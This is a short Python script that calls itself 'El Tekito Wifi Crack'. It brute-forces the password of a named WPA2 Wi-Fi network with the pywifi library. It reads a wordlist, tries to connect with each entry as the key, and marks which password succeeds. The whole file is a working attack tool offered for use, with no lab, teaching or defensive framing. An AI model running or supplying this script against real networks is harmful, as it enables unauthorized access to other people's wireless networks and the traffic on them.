from pywifi import PyWiFi
from pywifi import const
from pywifi import Profile
import time
from pyfiglet import figlet_format

print(figlet_format("El Tekito\nWifi Crack", font="cybermedium"))

wifiName = input("el_tekito@WifiCrack [Wifi Name] -> ")
wordlist = input("el_tekito@WifiCrack [Wordlist Location] -> ")


try:
    wifi = PyWiFi()
    iface = wifi.interfaces()[0]

    iface.scan()
    sonuc = iface.scan_results()
except:
    print("error!")

def Cracek(name, wordlist):
    count = 0
    with open (wordlist,"r",encoding="utf-8") as kelimeler:
        for kelime in kelimeler:
            count += 1
            kelime = kelime.split("\n")
            sifre = kelime[0]
            main(name, sifre)
            

def main(name, sifre):
    profile = Profile()
    profile.ssid = name
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP

    profile.key = sifre

    iface.remove_all_network_profiles()
    connect = iface.add_network_profile(profile)
    time.sleep(0.1)
    iface.connect(connect)
    time.sleep(1)
    if iface.status() == const.IFACE_CONNECTED:
        time.sleep(0.5)
        print("[+] {0}".format(sifre))
        
    else:
        print("[-] {0}".format(sifre))

Cracek(wifiName, wordlist)